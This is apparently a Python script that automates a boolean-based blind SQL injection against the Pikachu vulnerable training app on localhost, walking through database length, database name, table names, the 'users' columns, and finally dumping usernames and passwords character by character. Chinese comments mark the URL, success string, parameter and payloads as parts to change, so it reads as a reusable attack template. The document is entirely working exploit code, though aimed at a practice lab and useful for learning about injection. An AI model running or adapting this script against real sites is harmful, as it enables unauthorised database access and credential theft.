import requests

url = 'http://localhost/pikachu-master/vul/sqli/sqli_blind_b.php'#修改url
success = 'your email is'#修改成功响应的内容
var="name"#修改变量

def database_len():
    for i in range(1, 10):
        payload = f"?{var}=1%27+and+length%28database%28%29%29={i}%23" #修改payload
        r = requests.get(url+payload+"&submit=%E6%9F%A5%E8%AF%A2")#根据请求修改
        if success in r.text:
            print('database_length:', i)
            return i
        else:
            print(i)

def database_name(n):
    name = ''
    for j in range(1,n+1):
        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
            payload = f"?{var}=1%27+and+substr%28database%28%29%2C{j}%2C1%29%3D%27{i}%27%23"#修改payload
            r = requests.get(url + payload+"&submit=%E6%9F%A5%E8%AF%A2")#根据请求修改
            if success in r.text:
                name = name + i
                print(name)
                break
    print('database_name:', name)

def tables_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            payload = f"?{var}=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{j},1)='{i}'%23"#修改payload
            r = requests.get(url + payload+"&submit=%E6%9F%A5%E8%AF%A2")#根据请求修改
            if success in r.text:
                name = name + i
                print(name)
                break
    print('table_name:', name)

def columns_name():
    name = ''
    for j in range(1, 30):
        for i in 'abcdefghijklmnopqrstuvwxyz,':
            payload = f"?{var}=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),{j},1)='{i}'%23"#修改payload
            r = requests.get(url + payload+"&submit=%E6%9F%A5%E8%AF%A2")#根据请求修改
            if success in r.text:
                name = name + i
                print(name)
                break
    print('column_name:', name)

def value():
    name = ''
    for j in range(1, 100):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':
            payload = f"?{var}=1' and substr((select group_concat(username,password) from users),{j},1)='{i}'%23"#修改payload
            r = requests.get(url + payload+"&submit=%E6%9F%A5%E8%AF%A2")#根据请求修改
            if success in r.text:
                name = name + i
                print(name)
                break
    print('value:', name)

n=database_len()
database_name(n)
tables_name()
columns_name()
value() 